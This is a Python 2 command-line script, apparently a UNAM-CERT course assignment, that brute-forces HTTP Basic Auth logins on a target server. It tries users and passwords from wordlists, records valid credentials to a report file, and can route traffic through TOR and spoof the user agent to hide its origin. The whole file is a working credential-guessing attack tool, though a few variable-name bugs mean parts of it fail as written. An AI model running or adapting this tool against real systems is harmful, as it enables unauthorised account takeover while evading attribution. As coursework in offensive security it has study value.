#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
# Vallejo Fernández Rafael Alejandro
# Referencia para uso de TOR con python: https://medium.com/@jasonrigden/using-tor-with-the-python-request-library-79015b2606cb
import sys
import optparse
from requests import get, session  # session para realizar las peticiones mediante TOR
from requests.exceptions import ConnectionError

session = session()

def printError(msg, exit = False):
    """Función que imprime mensaje de error y sale del programa
    Recibe: mensaje a mostrar y booleano que indica si se debe terminar la ejecución del programa"""
    sys.stderr.write('Error:\t%s\n' % msg)
    if exit:
        sys.exit(1)

def addOptions():
    """Función que agrega opciones al script para su ejecución. Por defecto verbose, tor y agente son False"""
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default = None, help='Password that will be tested during the attack.')
    parser.add_option('-c', '--contrasenas', dest = 'filePasswords', default = None, help = 'Archivo de contrasenas a validar.')
    parser.add_option('-u', '--usuarios', dest = 'fileUsers', default = None, help = 'Archivo de usuarios a validar.')
    parser.add_option('-r', '--reporte', dest= 'reporte', default = None, help = 'Archivo donde se van a escribir los hallazgos.')
    parser.add_option('-v', '--verboso', action='store_true', dest = 'verboso', default = False, help = 'Muestra los pasos que se realizan.')

    # Tarea 6
    parser.add_option('-t', '--tor', action='store_true', dest = 'tor', default = False, help = 'Las peticiones se hacen por medio de TOR.')
    parser.add_option('-a', '--agente', action='store_true', dest = 'agente', default = False, help = 'Se cambia el agente de usuario de Python por otro.')

    opts,args = parser.parse_args()
    return opts

def checkOptions(options):
    """Función que verifica el estado de ciertas de opciones para poder ejecutar el script"""
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    if options.user is None and options.fileUsers is None:
        printError('Debes indicar un usuario o un archivo de usuarios.', True)
    if options.user is not None and options.fileUsers is not None:
        printError('Debe ser únicamente un usuario o un archivo de usuarios.', True)
    if options.password is None and options.filePasswords is None:
        printError('Debes indicar una contraseña o un archivo de contraseñas.', True)
    if options.password is not None and options.filePasswords is not None:
        printError('Debe ser únicamente una contraseña o un archivo de contrasenas.', True)

def reportResults(hallazgo, archivo):
    """Función que reporta los hallazgos en un archivo, los halazgos reportados son únicamente cuando se encuentran credenciales válidas
    Recibe texto a escribir y el archivo donde se escribirán"""
    with open(archivo, 'a') as output_file:
        output_file.write(hallazgo)

def buildURL(server, port, verbose, protocol = 'http'):
    """Función que da formato de la URL. Recibe direccion(server), puerto, verbose (si aplica). Devuelve la URL con el formato requerido"""
    url = '%s://%s:%s' % (protocol,server,port)
    if verbose:
        print 'Se obtiene la url con los parámetros indicados (server \'%s\', port \'%s\', protocol \'%s\'): %s' % (server, port, protocol, url)
    return url


def makeRequest(host, user, password, verbose):
    """Función que realiza las peticiones al servidor especificado. Recibe host, user, password y verbose. Si la opcion verbose es True, se
    muestra lo que se está realizando en cada paso. Se pregunta dentro de la función por las opciones --tor y --agente
    En caso de que --tor sea True se realiza la petición a través de TOR mediante los proxies y session()
    En caso de que --agente sea True se cambia el agente de usuario de Python por el de HotJava con los headers"""
    try:
        header = {}  # Diccionario vacío que indicará el agente, vació indica el agente original (Python)
        if opts.agente:
            header['User-agent'] = 'HotJava/1.1.2 FCS'  # Valor que se agrega al diccionario para cambiar el agente
        if opts.tor:
            session.proxies = {}
            session.proxies['http'] = 'socks5h://localhost:9050'  # Proxys http y https para realizar la petición mediante TOR
            session.proxies['https'] = 'socks5h://localhost:9050'
            response = session.get(host, auth=(user,password), headers = header)
        else:
            response = session.get(host, auth=(user,password), headers = header)
        if verbose:
            ip = session.get('http://httpbin.org/ip', headers = header)  # Se obtiene la ip desde la que se hace la petición
            ip = str(ip.text).replace('\"origin\":','').replace('{','').replace('}','').replace('\n','')
            print 'La petición se realiza desde:%s' % (ip)
            agente = session.get('https://httpbin.org/user-agent', headers = header)  # Se obtiene el agente de usuario con el que se hace la petición
            agente = str(agente.text).replace('\"user-agent\":','').replace('{','').replace('}','').replace('\n','')
            print 'El agente de usuario es:%s' % (agente)
            print 'Se está intentando ingresar con usuario \'%s\' contraseña \'%s\'' % (user, password)
            print 'La respuesta (response) obtenida es : %s y, por lo tanto:' % (response)
        if response.status_code == 200:
            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            if opts.reporte != None:
                reportResults('Usuario: \'%s\'\t\tContraseña: \'%s\'\n' % (user,password), opts.reporte)
        else:
            print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

def testPasswords(url, user, pasword, filePasswords, verbose):
    """Función que probará un usuario y las contraseñas si es que se indicó una sola o un archivo de contraseñas.
    Recibe url, user, pasword, filePasswords y verbose"""
    if pasword != None and filePasswords == None:
        if verbose:
            print 'Se indicó únicamente el usuario \'%s\' y la contraseña \'%s\'' % (user, password)
        makeRequest(url, user, password, verbose)
    elif password == None and filePasswords != None:
        with open(filePasswords,'r') as contrasenias:
            if verbose:
                print 'Se indicó únicamente el usuario \'%s\' y el archivo de contraseñas: %s' % (user, filePasswords)
            for contrasenia in contrasenias:
                makeRequest(url, user, contrasenia[:-1], verbose)

def testUsersAndPasswords(url, fileUsers, password, filePasswords, verbose):
    """"Función que probará usuarios porque se indicó un archivo de usuarios y se probará la contraseña o el archivo de contraseñas
    que se haya indicado. Recibe url, fileUsers, password, filePasswords y verbose"""
    with open(fileUsers,'r') as usuarios:
        unPassword = password != None and filePasswords == None
        archivoPassword = password == None and filePasswords != None
        if verbose:
            if unPassword:
                print 'Se indicó el archivo de usuarios \'%s\' y la contraseña \'%s\'' % (fileUsers, password)
            elif archivoPassword:
                print 'Se indicó el archivo de usuarios \'%s\' y el archivo de contraseñas \'%s\'' % (fileUsers, filePasswords)
        for user in usuarios:
            if unPassword:
                makeRequest(url, user[:-1], password, verbose)
            elif archivoPassword:
                with open(filePasswords,'r') as contrasenias:
                     for contrasenia in contrasenias:
                         makeRequest(url, user[:-1], contrasenia[:-1], verbose)

if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port, verbose = opts.verboso)
        if opts.reporte != None:  # Si se indicó archivo para escribir el reporte, se escribiran los hallazgos de usuarios válidos
            with open(opts.reporte, 'w') as nuevo_reporte:
                nuevo_reporte.write('Los usuarios y contraseñas válidos son:\n')
        if opts.user != None and opts.fileUsers == None:  # Si se indicó un solo usuario, se probarán las contraseñas o la contraseña que se indique
            testPasswords(url, opts.user, opts.pasword, opts.filePasswords, opts.verboso)
        elif opts.user == None and opts.fileUsers != None: # Si se indicó un archivo de usuarios se probarán las contraseñas o la contraseña que se indique
            testUsersAndPasswords(url, opts.fileUsers, opts.password, opts.filePasswords, opts.verboso)
    except IOError as lecturaArchivo:
        printError('El archivo que contiene los usuarios o las contraseñas no se encuentra')
        printError(lecturaArchivo, True)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
